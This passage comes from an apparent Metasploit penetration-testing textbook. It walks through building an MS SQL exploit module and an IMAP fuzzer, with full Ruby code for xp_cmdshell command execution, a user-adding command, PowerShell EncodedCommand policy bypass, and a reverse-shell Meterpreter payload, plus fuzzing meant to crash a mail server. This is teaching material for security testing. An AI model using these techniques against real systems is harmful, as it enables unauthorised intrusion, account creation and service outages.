or public area.\nThis approach to attacking wireless clients is often popular because it’s easier\nthan a brute force attack against a well-secured wireless infrastructure.\nNow that you’ve seen how easy it is to conduct this sort of attack, you’ll\nprobably think twice about using public wireless networks. Are you sure that\nthe coffee shop is offering “free public Wi-Fi”? Or perhaps someone is run-\nning Karmetasploit?\n184 Chapter 12\nB U I L D I N G Y O U R O W N M O D U L E\nBuilding your own Metasploit module is relatively\nsimple, as long as you have some programming experi-\nence and an idea of what you want to build. Because\nMetasploit is primarily Ruby-based, we’ll be working in\nthe Ruby programming language in this chapter. If you\naren’t a Ruby ninja yet, but you have some exposure\nto the language, don’t fret; continue to practice and learn. It’s fairly easy to\nlearn Ruby as you go. If you find yourself struggling with the concepts in this\nchapter, skip it for now, try to build up your Ruby knowledge, and revisit the\nchapter.\nIn this chapter, we’ll write a module called mssql_powershell to harness\natechnique released at the Defcon 18 Hacking Conference by Josh Kelley\n(winfang) and David Kennedy. This module targets Windows platforms with\nMicrosoft’s PowerShell installed (the default on Windows 7).\nThis module converts a standard MSF binary payload to a hex-blob (a\nhexadecimal representation of binary data) that can be transmitted to a tar-\nget system through Microsoft SQL commands. Once this payload is on the\ntarget system, a PowerShell script is used to convert the hexadecimal data\nback to a binary executable, execute it, and deliver a shell to the attacker. This\nmodule is already in Metasploit and was developed by one of the authors of\nthis book; it’s a great lesson on how to build your own modules.\nThe ability to convert a binary to hexadecimal, transmit it via MS SQL,\nand convert it back to binary is an excellent example of how powerful the\nMetasploit Framework can be. As you’re performing penetration tests, you\nwill encounter many unfamiliar scenarios or situations; your ability to create\nor modify modules and exploits on the fly will give you that needed edge. As\nyou begin to understand the Framework, you’ll be able to write these types of\nmodules in a relatively short amount of time.\nGetting Command Execution on Microsoft SQL\nAs mentioned in Chapter 6, most system administrators set the sa (system\nadministrator) account password to something weak, not realizing the impact\nof this simple mistake. The sa account is installed by default with the SQL\nrole of sysadmin, and when you’re performing penetration tests, you can\nalmost guarantee that a weak or blank sa account will exist on Microsoft SQL\nServer instances. We will use the MS SQL instance that you built in AppendixA\nto exploit a situation with our module. As discussed in Chapter 6, you initially\nscan the system with the Metasploit auxiliary modules and brute force the\nweak sa account.\nOnce you have brute forced the sa account, you can insert, drop, create,\nand perform most other tasks you would normally use in MS SQL. This includes\ncalling an extended administrative-level stored procedure called xp_cmdshell,\nas discussed in Chapter 6. This stored procedure lets you execute underlying\noperating system commands under the same security context used by the\nSQL Server service (for example, Local System).\nNOTE MS SQL installs with this stored procedure disabled in SQL Server 2005 and 2008,\nbut you can re-enable it using SQL commands if you have the sysadmin role within\nMS SQL. For example, you could use SELECT loginname FROM master..syslogins\nWHERE sysadmin=1 to view all users with this level of access and then become one of those\nusers. If you have the sysadmin role, you’re almost guaranteed a full-system compromise.\nThe following listing demonstrates how to run basic commands through\nMetasploit’s MS SQL modules:\n(cid:88) use msf > use admin/mssql/mssql_exec\n(cid:89) msf auxiliary(mssql_exec) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nCMD cmd.exe /c echo OWNED > C:\\owned.exe no Command to execute\nPASSWORD no The password for the\nspecified username\nRHOST yes The target address\nRPORT 1433 yes The target port\nUSERNAME sa no The username to authenticate as\n186 Chapter 13\n(cid:90) msf auxiliary(mssql_exec) > set RHOST 172.16.32.136\nRHOST => 172.16.32.136\n(cid:91) msf auxiliary(mssql_exec) > set CMD net user metasploit p@55w0rd /ADD\nCMD => net user metasploit p@55w0rd /ADD\nmsf auxiliary(mssql_exec) > exploit\n[*] SQL Query: EXEC master..xp_cmdshell 'net user metasploit p@55w0rd /ADD'\noutput\n------\n(cid:92) The command completed successfully.\n[*] Auxiliary module execution completed\nmsf auxiliary(mssql_exec) >\nIn this example, we first select the mssql_exec auxiliary module at (cid:88), which\ncalls the xp_cmdshell stored procedure to execute commands. Next, we view\nthe module’s options at (cid:89) and set our target at (cid:90) and the command to exe-\ncute on the target at (cid:91). Finally, we run the exploit with exploit, and you can\nsee at (cid:92) that the exploit is successful. We’ve added a user to the system using\nthe xp_cmdshell stored procedure. (At this point we could enter net localgroup\nadministrators metasploit /ADD to add the user to the local administrators group\non the compromised system.)\nYou can think of the mssql_exec module as a command prompt accessible\nvia MS SQL.\nExploring an Existing Metasploit Module\nNow we’ll examine what is actually occurring “under the hood” of the module\nwe just worked with, mssql_exec. This allows us to get a feel for how existing\ncode is operating before we write our own. Let’s open the module with a text\neditor to see how it operates:\nroot@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb\nThe following lines excerpted from the module yield a few important\nthings worthy of note:\n(cid:88) require 'msf/core'\n(cid:89) class Metasploit3 < Msf::Auxiliary\n(cid:90)include Msf::Exploit::Remote::MSSQL\ndef run\n(cid:91)mssql_xpcmdshell(datastore['CMD'], true)\nif mssql_login_datastore\nend\nBuilding Your Own Module 187\nThe first line at (cid:88) tells us that this module will include all functionality\nfrom Metasploit’s core libraries. Next the class is set at (cid:89) with code that defines\nthis as an auxiliary module that inherits certain characteristics of, for example,\nscanners, denial-of-service vectors, data retrieval, brute force attacks, and\nreconnaissance attempts.\nThe include statement at (cid:90) is probably one of the most important lines,\nbecause it pulls in the MS SQL module from the core Metasploit libraries.\nEssentially, the MS SQL module handles all MS SQL–based communications\nand anything related to MS SQL. Finally, at (cid:91) it pulls a specific command\nfrom the Metasploit datastore.\nLet’s examine the MS SQL function in the Metasploit core libraries\ntoget a better understanding of its power. First, open mssql.rb and then\nmssql_commands.rb with the following commands, each in a different window:\nroot@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql.rb\nroot@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql_commands.rb\nPress CTRL-W in Nano to search for mssql_xpcmdshell in mssql.rb, and you\nshould find the definition that tells Metasploit how to use the xp_cmdshell pro-\ncedure, as shown next:\n#\n# Execute a system command via xp_cmdshell\n#\ndef mssql_xpcmdshell(cmd,doprint=false,opts={})\nforce_enable = false\nbegin\nres = mssql_query(\"EXEC master..xp_cmdshell(cid:88) '#{cmd}'(cid:89)\", false, opts)\nThis listing defines the SQL query to be run against the server as a call\nto the xp_cmdshell stored procedure at (cid:88) and a variable that will be replaced\nwith the command line the user requests to be executed at (cid:89). For instance,\nan attempt to add a user to the system would execute within MS SQL as EXEC\nmaster..xp_cmdshell 'net user metasploit p@55w0rd! /ADD' by setting the cmd vari-\nable to 'net user metasploit p@55w0rd! /ADD'.\nNow turn your attention to the mssql_commands.rb, where the commands\nto enable the xp_cmdshell procedure live:\n# Re-enable the xp_cmdshell stored procedure in 2005 and 2008\ndef mssql_xpcmdshell_enable(opts={});\n\"exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec\nmaster.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;\"(cid:88)\nHere you can see the sequence of commands (cid:88) issued to re-enable the\nxp_cmdshell stored procedure in MS SQL Server 2005 and 2008.\nNow that you understand the functions we will be using in creating our\nown module, let’s get started.\n188 Chapter 13\nCreating a New Module\nSuppose you’re working on a penetration test and you encounter a system\nrunning SQL Server 2008 and Microsoft Server 2008 R2. Because Microsoft\nremoved debug.exe on Windows 7 x64 and Windows Server 2008, these systems\nwon’t allow you to convert executables in a traditional way as defined in\nChapter 11. That means you need to create a new module that will allow you\nto attack a Microsoft Server 2008 and SQL Server 2008 instance successfully.\nWe’ll make certain assumptions for purposes of this scenario. First, you’ve\nalready guessed that the SQL Server password is blank, and you have gained\naccess to the xp_cmdshell stored procedure. You need to deliver a Meterpreter\npayload onto the system, but all ports other than 1433 are closed. You don’t\nknow whether a physical firewall is in place or if the Windows-based firewall\nis in use, but you don’t want to modify the port list or turn off the firewall\nbecause that might raise suspicion.\nPowerShell\nWindows PowerShell is our only viable option here. PowerShell is a compre-\nhensive Windows scripting language that allows you to access the full Microsoft\n.NET Framework from the command line. PowerShell’s active community\nworks at extending the tool, making it a valuable tool for security professionals\nbecause of its versatility and compatibility with .NET. We aren’t specifically\ngoing to dive into how PowerShell works and its functions, but you should\nknow that it is a full-fledged programmatic language available to you on\nnewer operating systems.\nWe’ll create a new module that will use Metasploit to convert the binary\ncode to hexadecimal (or Base64 if desired), and then echo it onto the under-\nlying operating system. Then we’ll use PowerShell to convert the executable\nback to a binary that you can execute.\nTo begin, we create a boilerplate by copying the mssql_payload exploit\nasfollows:\nroot@bt:/opt/framework3/msf3# cp modules/exploits/windows/mssql/mssql_payload.rb\nmodules/exploits/windows/mssql/mssql_powershell.rb\nNext, we open the mssql_powershell.rb file we just created and modify its\ncode so that it looks just like the following. This is an exploit base shell. Take\nsome time to review the various parameters and remember the topics covered\nin the previous chapters.\nrequire 'msf/core' # require core libraries\nclass Metasploit3 < Msf::Exploit::Remote # define this as a remote exploit\nRank = ExcellentRanking # reliable exploit ranking\ninclude Msf::Exploit::Remote::MSSQL # include the mssql.rb library\nBuilding Your Own Module 189\ndef initialize(info = {}) # initialize the basic template\n(cid:88)super(update_info(info,\n'Name' => 'Microsoft SQL Server PowerShell Payload',\n'Description' => %q{\nThis module will deliver our payload through Microsoft PowerShell\nusing MSSQL based attack vectors.\n},\n'Author' => [ 'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>'],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 8771 $',\n'References' =>\n[\n[ 'URL', 'http://www.secmaniac.com' ]\n],\n(cid:89)'Platform' => 'win', # target only windows\n'Targets' =>\n[\n[ 'Automatic', { } ], # automatic targeting\n],\n(cid:90)'DefaultTarget' => 0\n))\nregister_options( # register options for the user to pick from\n[\n(cid:91)OptBool.new('UsePowerShell',[ false, \"Use PowerShell as payload delivery\nmethod instead\", true]), # default to PowerShell\n])\nend\ndef exploit # define our exploit here; it does nothing at this point\n(cid:92)handler # call the Metasploit handler\ndisconnect # after handler disconnect\nend\nend\nBefore this exploit will work properly, you’ll need to define some basic\nsettings. Notice that the name, description, licensing, and references are\ndefined at (cid:88). We also define a platform at (cid:89) (Windows) and a target at (cid:90)\n(all operating systems). We also define a new parameter called UsePowerShell\nat (cid:91) for use in the body of the exploit. Lastly, a handler is specified at (cid:92) to\nhandle the connections between the attacker and the exploited target.\nRunning the Shell Exploit\nWith the skeleton of the exploit built, we run it through msfconsole to see what\noptions are available:\nmsf > use windows/mssql/mssql_powershell\nmsf exploit(mssql_powershell) > show options\n190 Chapter 13\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD no The password for the specified username\nRHOST yes The target address\nRPORT 1433 yes The target port\nUSERNAME sa no The username to authenticate as\nUsePowerShell true no Use PowerShell as payload delivery method instead\nRecall from Chapter 5 that the show options command will display any\nnew options that have been added to an exploit. After we set these options,\nthey will be stored within Metasploit as valid options.\nNow we’ll finalize the mssql_powershell.rb file, which we have been editing\nsince the beginning of this chapter, before we edit mssql.rb (which will be\nexplained shortly).\nWhen you examine the exploits in the modules directory inside Metasploit\n(modules/exploits, modules/auxiliary/, and so on), you’ll notice that most of\nthem have the same overall structure (def exploit as an example). Remember\nalways to comment your code to give other developers an idea of what it’s\ndoing! In the following listing, we first introduce our def exploit line, which\ndefines what we’ll be doing in our exploit. We’ll frame our exploit the same\nway as the other modules and add a few new sections, as explained next:\ndef exploit\n# if u/n and p/w didn't work throw error\n(cid:88)if(not mssql_login_datastore)\n(cid:89)print_status(\"Invalid SQL Server credentials\")\nreturn\nend\n# Use powershell method for payload delivery\n(cid:90)if (datastore['UsePowerShell'])\n(cid:91)powershell_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))\nend\nhandler\ndisconnect\nend\nend\nThe module first checks to see if we are logged in at (cid:88). If we aren’t logged\nin, the error message \"Invalid SQL Server Credentials\" (cid:89) is displayed. The\nUsePowerShell method at (cid:90) is used to call the function powershell_upload_exec (cid:91),\nwhich will automatically create a Metasploit-based payload that we specify\nBuilding Your Own Module 191\nduring our exploit. After we finally run the exploit, when we specify our\npayload in msfconsole, it will automatically generate it for us based on the\nMsf::Util::EXE.to_win32pe(framework,payload.encoded) option.\nCreating powershell_upload_exec\nNow we’ll open the mssql.rb file that we opened earlier, in preparation for\nediting. We need to find space for the powershell_upload_exec function.\nroot@bt:/opt/framework3/msf3# nano lib/msf/core/exploit/mssql.rb\nIn your version of Metasploit, you can do a search for PowerShell, and\nyou should see the referenced code that follows in the mssql.rb file. Feel free\nto delete this code from the file and start from scratch.\n#\n# Upload and execute a Windows binary through MS SQL queries and PowerShell\n#\n(cid:88)def powershell_upload_exec(exe, debug=false)\n# hex converter\n(cid:89)hex = exe.unpack(\"H*\")[0]\n# create random alpha 8 character names\n(cid:90)var_payload = rand_text_alpha(8)\n(cid:91)print_status(\"Warning: This module will leave #{var_payload}.exe in the SQL\nServer %TEMP% directory\")\nAt (cid:88) you see that our definition includes the commands exe and debug\nparameters that are added to the def powershell_upload_exec function. The\nexecommand is the executable we will be sending from our original code\nMsf::Util::EXE.to_win32pe(framework,payload.encoded), as mentioned previ-\nously. The debug command is set to false, which means we will not see debug\ninformation. Generally this would be set to true if you wanted to see addi-\ntional information for troubleshooting.\nNext, at (cid:89) we convert the entire encoded executable to raw hexadecimal\nformat. The H in this line simply means “open the file as a binary and place it\nin a hexadecimal representation.”\nAt (cid:90) we create a random, alphabetical, eight-character filename. It’s\nusually best to randomize this name to throw off antivirus software.\nAnd finally, at (cid:91) we tell the attacker that our payload will remain on the\noperating system, in the SQL Server /Temp directory.\nConversion from Hex to Binary\nThe following listing shows the conversion from hexadecimal back to binary,\nwritten in PowerShell. The code is defined as a string to be called later and\nuploaded to the target machine.\n192 Chapter 13\n# Our payload converter grabs a hex file and converts it to binary through PowerShell\n(cid:88) h2b = \"$s = gc 'C:\\\\Windows\\\\Temp\\\\#{var_payload}';$s = [string]::Join('', $s);$s= (cid:89)$s.\nReplace('`r',''); $s = $s.Replace(''`n','');$b = new-object byte[] $($s.Length/\n2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};\n[IO.File]::WriteAllBytes('C:\\\\Windows\\\\Temp\\\\#{var_payload}.exe',$b)\"\n(cid:90) h2b_unicode=Rex::Text.to_unicode(h2b)\n# base64 encoding allows us to perform execution through powershell without registry changes\n(cid:91) h2b_encoded = Rex::Text.encode_base64(h2b_unicode)\n(cid:92) print_status(\"Uploading the payload #{var_payload}, please be patient...\")\nAt (cid:88) we create the hex-to-binary (h2b) conversion method through\nPowerShell. This code essentially creates a byte array that will write out the\nhex-based Metasploit payload as a binary file. (The {var_payload} is a random\nname specified through Metasploit.)\nBecause MS SQL has character limit restrictions, we need to break our\nhexadecimal payload into 500-byte chunks that separate the payload into\nmultiple requests. But one side effect of this splitting is that carriage returns\nand line feeds (CRLF) are added to the file on the target, and these need to\nbe stripped out. At (cid:89) we add better handling of CRLFs by stripping them out\nproperly. If we didn’t do this, our binary would be corrupt and would not\nexecute properly. Notice that we are simply redesignating the $s variable to\nreplace `r and `n with '' (nothing). This effectively removes CRLFs.\nOnce the CRLFs are stripped out, Convert::ToByte is invoked in the hex-\nbased Metasploit payload. We tell PowerShell that the file’s format is base 16\n(hexadecimal format) and to write it out to a file called #{var_payload}.exe\n(our random payload name). After the payload has been written, we can run\na method for executing PowerShell commands in an encoded format that is\nsupported by the PowerShell programming language. These encoded com-\nmands allow us to execute lengthy and large amounts of code on one line.\nBy first converting the h2b string at (cid:90) to Unicode and then Base64\nencoding the resultant string at (cid:91), we can pass the –EncodedCommand flag\nthrough PowerShell to bypass execution restrictions that would normally\nexist. The execution restriction policies do not allow untrusted scripts to be\nexecuted. (These restrictions are an important way to protect users from exe-\ncuting just any script they download on the Internet.) If we didn’t encode\nthese commands, we wouldn’t be able to execute our PowerShell code and\nultimately wouldn’t be able to compromise the target system. Encoding the\ncommands allow us to add lots of code to one command without worrying\nabout execution restriction policies.\nAfter we specified the h2b string and encoded command flags, we get the\nPowerShell commands in the correct encoded format so that we can execute\nour PowerShell code in an unrestricted format.\nBuilding Your Own Module 193\nAt (cid:90), the string was converted to Unicode; this is a requirement to have\nthe arguments and information passed to PowerShell. The h2b_encoded =\nRex::Text.encoded_base64(h2b_unicode) is then passed to convert it to a Base64-\nencoded string to be passed through MS SQL. Base64 is the encoding required\nto leverage the –EncodedCommand flag. We first converted our string to Unicode,\nand then to Base64, which is the format we need for all of our PowerShell\ncommands. Finally, at (cid:92) a message stating that we are in the process of\nuploading the payload is printed to the console.\nCounters\nCounters help you track your location in a file or keep track of how much\ndata the program has read in. In the next example, a base counter called idx\nstarts at 0. The counter is used to identify the end of the file and move up 500\nbytes at a time when the hexadecimal-based binary is being sent to the oper-\nating system. Essentially, the counter is saying, “Read 500 bytes, and then\nsend. Read another 500 bytes, and then send,” until it reaches the end of\nthefile.\n(cid:88) idx=0\n(cid:89) cnt = 500\n(cid:90) while(idx < hex.length - 1)\nmssql_xpcmdshell(\"cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\\\#{var_payload}\", false)\nidx += cnt\nend\n(cid:91) print_status(\"Converting the payload utilizing PowerShell EncodedCommand...\")\nmssql_xpcmdshell(\"powershell -EncodedCommand #{h2b_encoded}\", debug)\nmssql_xpcmdshell(\"cmd.exe /c del %TEMP%\\\\#{var_payload}\", debug)\nprint_status(\"Executing the payload...\")\nmssql_xpcmdshell(\"%TEMP%\\\\#{var_payload}.exe\", false, {:timeout => 1})\nprint_status(\"Be sure to cleanup #{var_payload}.exe...\")\nend\nRecall that to deliver the payload to the target operating system, we need\nto split it into 500-byte chunks. We use the counters idx (cid:88) and cnt (cid:89) to track\nhow the payload is being split up. The counter idx will gradually increase by 500,\nand we set the other counter cnt to 500 (we need to read in 500 bytes at a\ntime). After the first 500 bytes have been read from the Metasploit payload\nat (cid:90), the 500 hexadecimal characters will be sent to the target machine. The\n500-byte chunks continue to be added until the idx counter reaches the same\nlength as the payload, which equals the end of the file.\nAt (cid:91) we see a message that the payload is being converted and sent to\nthe target using the –EncodedCommand PowerShell command, which is where the\nconversion is occurring from the normal PowerShell command to a Base64\nencoded format (mentioned earlier).\nThe line \"powershell –EncodedCommand #{h2b_encoded}\" tells us that the pay-\nload has executed. The PowerShell commands that we converted to Base64\nwill convert the hexadecimal-based payload back to binary after it is executed.\n194 Chapter 13\nThe following shows the entire mssql.rb file:\n#\n# Upload and execute a Windows binary through MSSQL queries and Powershell\n#\ndef powershell_upload_exec(exe, debug=false)\n# hex converter\nhex = exe.unpack(\"H*\")[0]\n# create random alpha 8 character names\n#var_bypass = rand_text_alpha(8)\nvar_payload = rand_text_alpha(8)\nprint_status(\"Warning: This module will leave #{var_payload}.exe in the SQL\nServer %TEMP% directory\")\n# our payload converter, grabs a hex file and converts it to binary for us through\npowershell\nh2b = \"$s = gc 'C:\\\\Windows\\\\Temp\\\\#{var_payload}';$s = [string]::Join('', $s);$s\n= $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[]$($s\n.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring\n($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\\\Windows\\\\Temp\\\\#{var_payload}\n.exe',$b)\"\nh2b_unicode=Rex::Text.to_unicode(h2b)\n# base64 encode it, this allows us to perform execution through powershell without\nregistry changes\nh2b_encoded = Rex::Text.encode_base64(h2b_unicode)\nprint_status(\"Uploading the payload #{var_payload}, please be patient...\")\nidx = 0\ncnt = 500\nwhile(idx < hex.length - 1)\nmssql_xpcmdshell(\"cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\\\#{var_payload}\", false)\nidx += cnt\nend\nprint_status(\"Converting the payload utilizing PowerShell EncodedCommand...\")\nmssql_xpcmdshell(\"powershell -EncodedCommand #{h2b_encoded}\", debug)\nmssql_xpcmdshell(\"cmd.exe /c del %TEMP%\\\\#{var_payload}\", debug)\nprint_status(\"Executing the payload...\")\nmssql_xpcmdshell(\"%TEMP%\\\\#{var_payload}.exe\", false, {:timeout => 1})\nprint_status(\"Be sure to cleanup #{var_payload}.exe...\")\nend\nRunning the Exploit\nWith our work on mssql_powershell.rb and mssql.rb complete, we can run the\nexploit through Metasploit and msfconsole. But before we do, we need to\nmake sure that PowerShell is installed. Then we can run the following com-\nmands to execute our newly created exploit:\nmsf > use windows/mssql/mssql_powershell\nmsf exploit(mssql_powershell) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mssql_powershell) > set LHOST 172.16.32.129\nLHOST => 172.16.32.129\nmsf exploit(mssql_powershell) > set RHOST 172.16.32.136\nBuilding Your Own Module 195\nRHOST => 172.16.32.136\nmsf exploit(mssql_powershell) > exploit\n[*] Started reverse handler on 172.16.32.129:4444\n[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory\n[*] Uploading the payload CztBAnfG, please be patient...\n[*] Converting the payload utilizing PowerShell EncodedCommand...\n[*] Executing the payload...\n[*] Sending stage (748032 bytes) to 172.16.32.136\n[*] Be sure to cleanup CztBAnfG.exe...\n[*] Meterpreter session 1 opened (172.16.32.129:4444 -> 172.16.32.136:49164) at 2010-05-17\n16:12:19 -0400\nmeterpreter >\nThe Power of Code Reuse\nThis process of leveraging existing code, tweaking it, and adding in some\noriginal code is one of the most powerful things we can do with Metasploit.\nYou have no reason to start from scratch in most situations after you have a\nfeel for the Framework and you take a look at how existing code works. Because\nthis module was essentially built for you, you can get more practice by going\nthrough other Metasploit modules and seeing what they are doing and how\nthey work. You’ll start to learn the basics of buffer overflows and how they are\ncreated. Notice how the code is structured and how it works, and then create\nyour own exploits from scratch. If you’re not familiar with the Ruby program-\nming language or if this chapter was a bit over your head, pick up a book and\nread and learn. The best way to learn how to create these types of module\ndevelopment is through trial and error.\n196 Chapter 13\nC R E A T I N G Y O U R O W N E X P L O I T S\nAs a penetration tester, you will frequently encounter\napplications for which no Metasploit modules are avail-\nable. In such situations, you can attempt to uncover\nvulnerabilities in the application and develop your own\nexploits for them.\nOne of the easiest ways to discover a vulnerability is to fuzz the applica-\ntion. Fuzz testing is the act of sending invalid, unexpected, or malformed ran-\ndom data to an application and monitoring it for exceptions such as crashes.\nIf a vulnerability is found, you can work to develop an exploit for it. Fuzzing\nis a vast topic and entire books have been written on the subject. We will only\nbriefly scratch the surface of fuzzing prior to moving on and developing a\nworking exploit module.\nIn this chapter we’ll walk you though the process of identifying a vulner-\nability via fuzzing and exploit development, using the known vulnerability in\nNetWin SurgeMail 3.8k4-4, discovered by Matteo Memelli (ryujin) and available\nat http://www.exploit-db.com/exploits/5259/. This application had a vulnerabil-\nity that made it improperly handle overly long LIST commands, resulting in a\nstack overflow that let an attacker execute code remotely.\nNOTE This chapter assumes that you are familiar with exploit development and comfortable\nwith the concept of buffer overflows and the use of a debugger. If you need a bit of a\nrefresher, you’ll find some excellent tutorials by corelanc0d3r on the Exploit Database\nsite, http://www.exploit-db.com/. At a minimum, consider reading “Exploit\nWriting Tutorial Part 1: Stack Based Overflows” (http://www.exploit-db.com/\ndownload_pdf/13535/) and “Exploit Writing Tutorial Part 3: SEH” (http://\nwww.exploit-db.com/download_pdf/13537/).\nThe Art of Fuzzing\nBefore you develop any exploit, you need to determine whether a vulnerabil-\nity exists in the application. This is where fuzzing comes into play.\nThe following listing shows the code for a simple Internet Message Access\nProtocol (IMAP) fuzzer. Save this to your /root/.msf3/modules/auxiliary/fuzzers/\ndirectory, but be sure to keep your testing modules in a folder separate from\nthe main Metasploit trunk.\nrequire 'msf/core'\nclass Metasploit3 < Msf::Auxiliary\n(cid:88)include Msf::Exploit::Remote::Imap\n(cid:89)include Msf::Auxiliary::Dos\ndef initialize\nsuper(\n'Name' => 'Simple IMAP Fuzzer',\n'Description' => %q{\nAn example of how to build a simple IMAP fuzzer.\nAccount IMAP credentials are required in this\nfuzzer.},\n'Author' => [ 'ryujin' ],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 1 $'\n)\nend\ndef fuzz_str()\n(cid:90)return Rex::Text.rand_text_alphanumeric(rand(1024))\nend\ndef run()\nsrand(0)\nwhile (true)\n(cid:91)connected = connect_login()\nif not connected\nprint_status(\"Host is not responding - this is G00D ;)\")\nbreak\nend\nprint_status(\"Generating fuzzed data...\")\n(cid:92)fuzzed = fuzz_str()\nprint_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\n(cid:93)req = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\nprint_status(req)\n198 Chapter 14\nres = raw_send_recv(req)\nif !res.nil?\nprint_status(res)\nelse\nprint_status(\"Server crashed, no response\")\nbreak\nend\ndisconnect()\nend\nend\nend\nThe fuzzer module begins by importing the IMAP (cid:88) and denial-of-service (cid:89)\nmixins. Including IMAP gives you the required login functionality, and since\nthe goal of the fuzzer is to crash the server, this module results in a denial\nof service.\nAt (cid:90) the fuzz string (the malformed data we want to send) is set as a random-\nized string of alphanumeric characters with a maximum length of 1024 bytes.\nThe fuzzer connects and logs into the remote service at (cid:91), and if it fails to\nconnect and the loop breaks, you have something worth investigating. The\nlack of response by the server might mean that you’ve successfully caused an\nexception in the remote service.\nAt (cid:92) the variable fuzzed is set to the random string generated by the\nFramework, and the malicious request (cid:93) is built according to the published\nexploit code by appending the malicious data to the vulnerable LIST com-\nmand. If the fuzzer doesn’t receive a response from the server, it prints the\nmessage \"Server crashed, no response\" and quits.\nTo test your new fuzzer, start up msfconsole, load the module, and set its\noptions as follows:\nmsf > use auxiliary/fuzzers/imap_fuzz\nmsf auxiliary(imap_fuzz) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nIMAPPASS no The password for the specified username\nIMAPUSER no The username to authenticate as\nRHOST yes The target address\nRPORT 143 yes The target port\nmsf auxiliary(imap_fuzz) > set IMAPPASS test\nIMAPPASS => test\nmsf auxiliary(imap_fuzz) > set IMAPUSER test\nIMAPUSER => test\nmsf auxiliary(imap_fuzz) > set RHOST 192.168.1.155\nRHOST => 192.168.1.155\nmsf auxiliary(imap_fuzz) >\nCreating Your Own Exploits 199\nThe fuzzer should now be ready to go. Make sure that your debugger of\nchoice (we’re using the Immunity Debugger in our examples) is attached to\nthe surgemail.exe process, and start the fuzzer:\nmsf auxiliary(imap_fuzz) > run\n(cid:88) [*] Authenticating as test with password test...\n[*] Generating fuzzed data...\n(cid:89) [*] Sending fuzzed data, buffer length = 684\n(cid:90) [*] 0002 LIST () \"/v1AD7DnJTVykXGYYM6BmnXuYRlZNIJUzQzFPvASjYxzdTTOngBJ5gfK0XjLy3ciAAk1Fmo0\nRPEpq6f4BBnp5jm3LuSbAOj1M5qULEGEv0DMk0oOPUj6XPN1VwxFpjAfFeAxykiwdDiqNwnVJAKyr6X7C5ije7\nDSujURybOp6BkKWroLCzQg2AmTuqz48oNeY9CDeirNwoITfIaC40Ds9OgEDtL8WN5tL4QYdVuZQ85219Thogk7\n75GVfNH4YPpSo2PLmvd5Bf2sY9YDSvDqMmjW9FXrgLoUK2rl9cvoCbTZX1zuU1dDjnJJpXDuaysDfJKbtHn9Vh\nsiiYhFokALiF1QI9BRwj4bo0kwZDn8jyedxhSRdU9CFlMs19CvbVnnLWeRGHScrTxpduVJZygbJcrRp6AWQqke\nY0DzI4bd7uXgTIHXN6R403ALckZgqOWcUSEWj6THI9NFAIPP1LEnctaK0uxbzjpS1ize16r388StXBGq1we7Qa\n8j6xqJsN5GmnIN4HQ4W4PZIjGRHUZC8Q4ytXYEksxXe2ZUhl5Xbdhz13zW2HpxJ2AT4kRU1wDqBUkEQwvKtoeb\nrfUGJ8bvjTMSxKihrDMk6BxAnY6kjFGDi5o8hcEag4tzJ1FhH9eI2UHDVbsDmUHTfAFbreJTHVlcIruAozmZKz\ni7XgTaOgzGh\" \"PWNED\"\n(cid:91) [*] 0002 OK LIST completed\n. . . SNIP . . .\n[*] Authenticating as test with password test...\n[*] Generating fuzzed data...\n[*] Sending fuzzed data, buffer length = 1007\n[*] 0002 LIST () 